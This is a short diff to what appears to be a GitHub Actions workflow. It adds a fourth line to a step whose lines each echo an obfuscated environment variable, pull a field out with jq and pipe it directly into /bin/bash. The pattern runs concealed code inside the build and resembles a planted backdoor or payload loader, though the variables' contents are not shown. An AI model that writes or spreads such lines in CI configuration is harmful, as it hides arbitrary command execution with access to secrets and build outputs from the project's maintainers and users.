@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$wc55" | jq -r .bcr888 | /bin/bash
           echo $et62 | jq -r .s415 | /bin/bash
           echo $wwlqp125 | jq -r .ajosv86456 | /bin/bash
+          echo $mx22272 | jq -r .m90798 | /bin/bash
 
       - name: Upload artifact
         if: always()
